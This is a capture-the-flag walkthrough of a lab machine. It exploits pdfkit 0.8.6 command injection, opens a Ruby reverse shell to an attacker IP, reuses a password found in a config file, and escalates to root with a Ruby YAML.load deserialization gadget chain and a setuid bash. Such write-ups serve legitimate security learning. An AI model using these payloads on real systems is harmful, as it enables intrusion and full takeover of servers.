We tried running a subdomain scan and a `gobuster` scan, which didn't give any results.

There were 2 ports open. `22` and `80`. Both were up-to-date.

On port 80, there is a webserver running. It will make any webpage into a PDF.
So, we went looking for the program it uses to convert HTML to PDF.

When we inputted a URL, and downloaded the PDF, this is what we found in the contents (used `cat`):
```
┌─[✗]─[root@edu-virtualbox]─[/tmp]
└──╼ #cat 977o1sz9ph3smxm7zpfrylmf11sq86u7.pdf | grep pdfkit --text
/Creator (Generated by pdfkit v0.8.6)
    <rdf:li>Generated by pdfkit v0.8.6</rdf:li>
```
"pdfkit v0.8.6", so we went looking for an exploit
We found the [exploit](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795) after googling "pdfkit 0.8.6 exploit"

Command injection using CVE-2022-25765: 
```
http://10.10.14.8:8000/index.html?name=#{'%20`sleep 5000`'}
```
When we inputted this, the server went unresponsive, so the exploit worked.

We used a Ruby reverse shell from [revshells.com](https://www.revshells.com)
```
http://10.10.14.8:8000/index.html?name=#{'%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.8",5555))'`'}
```

Then we checked out the home directory:
```
drwxr-xr-x  4 henry henry 4096 Jan  8 08:41 henry
drwxr-xr-x  7 ruby  ruby  4096 Jan  8 09:08 ruby
```
2 users, `henry` and `ruby`.
We already had `ruby`, so time for lateral privelege escalation to `henry`.

We tried `linpeas.sh`, but nothing turned up.

After digging around in the `/home/ruby` directory, we found this:
```
ruby@precious:~$ cat .bundle/config 
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```
These are credentials for the `henry` user.

We found the flag in the home directory of `henry`.
```
henry@precious:~$ cat user.txt 
6221ebb70991a8debaf41074ba3bd37b
```

After using `sudo -l` with the password we found, we can run a program as root.
```
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb

```

We found that in `/opt/update_dependencies.rb`, a file was loaded without a full path. This stood out:
```
YAML.load(File.read("dependencies.yml"))
```

So we looked for "ruby YAML load exploit", and we found the [exploit](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/)

We made a file named `dependencies.yml`:
```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```
The command was ran in the `git_set: COMMAND_HERE`, so we used
```
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
```
and got a root shell.

root flag:
```
12fed37f0570a7957bf30fae66e12931
```